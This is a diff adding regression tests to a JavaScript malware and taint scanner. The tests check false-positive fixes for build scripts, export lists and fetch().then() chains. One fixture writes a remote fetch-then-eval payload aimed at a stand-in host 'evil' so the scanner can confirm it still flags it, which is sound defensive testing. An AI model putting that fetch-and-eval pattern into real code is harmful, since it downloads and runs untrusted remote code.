@@ -776,6 +776,59 @@ const result = spawnSync(process.execPath, ['--check', '--input-type=module'], {
   assert.equal(taint004[0].sink.callee, 'spawnSync')
 })
 
+test('read → file-write 是 SEN-TAINT-005 而非 SEN-AGENT-003(构建脚本误报回归)', async () => {
+  const { semanticScan } = await import('../engine/semantic/index.js')
+  // 真实案例:task-passport site/build.mjs — 静态站点生成(读 markdown 写 html)
+  const src = `
+import { readFile, writeFile } from 'node:fs/promises'
+const spec = await readFile('docs/spec.md', 'utf8')
+await writeFile('out/spec.html', render(spec))`
+  const findings = semanticScan(src, 'a.js')
+  const agent003 = findings.filter((f) => f.ruleId === 'SEN-AGENT-003')
+  const taint005 = findings.filter((f) => f.ruleId === 'SEN-TAINT-005')
+  assert.equal(agent003.length, 0, 'read→write 不得标成"模型可控输入"(SEN-AGENT-003)')
+  assert.equal(taint005.length, 1, 'read→write 应标为 SEN-TAINT-005')
+})
+
+test('export 列表形态 { name, apply } 通过入口契约(压缩 bundle 回归)', async () => {
+  const { hasExportContract } = await import('../engine/scanner.js')
+  const tmp = mkdtempSync(join(tmpdir(), 'exp-list-'))
+  try {
+    const f = join(tmp, 'bundle.js')
+    writeFileSync(f, 'export const CURSOR_API_URL="x";export { CURSOR_API_URL, name, apply }')
+    assert.equal(hasExportContract(f), true, 'export { name, apply } 应通过')
+    const f2 = join(tmp, 'noapply.js')
+    writeFileSync(f2, 'export { name }')
+    assert.equal(hasExportContract(f2), false, '缺 apply 不应通过')
+  } finally {
+    rmSync(tmp, { recursive: true, force: true })
+  }
+})
+
+test('fetch().then() 普通异步链不命中 SEN-EXEC-001(客户端 API 误报回归)', async () => {
+  const { scan } = await import('../engine/index.js')
+  const tmp = mkdtempSync(join(tmpdir(), 'exec001-'))
+  try {
+    // 普通异步链:fetch().then(回调) 无执行器
+    writeFileSync(join(tmp, 'normal.js'), `
+function apiGet(url) {
+  return fetch(url).then(function (r) {
+    if (!r.ok) throw new Error(String(r.status))
+    return r.json()
+  })
+}`)
+    const normal = await scan(join(tmp, 'normal.js'))
+    assert.equal(normal.findings.some((f) => f.id === 'SEN-EXEC-001'), false, 'fetch().then(普通回调)不命中')
+
+    // 真恶意形态仍命中:then 回调内直接 eval
+    writeFileSync(join(tmp, 'evil.js'), `fetch('https://evil/x').then(r => { eval(r.text()) })`)
+    const evil = await scan(join(tmp, 'evil.js'))
+    assert.ok(evil.findings.some((f) => f.id === 'SEN-EXEC-001'), 'then 内 eval 仍命中')
+  } finally {
+    rmSync(tmp, { recursive: true, force: true })
+  }
+})
+
 test('gzip bomb:压缩包超限被拒绝(TAR_LIMITS 可注入)', async () => {
   const { extractTarballSafe, TAR_LIMITS } = await import('../engine/package/tar.js')
   const root = mkdtempSync(join(tmpdir(), 'gzip-bomb-'))
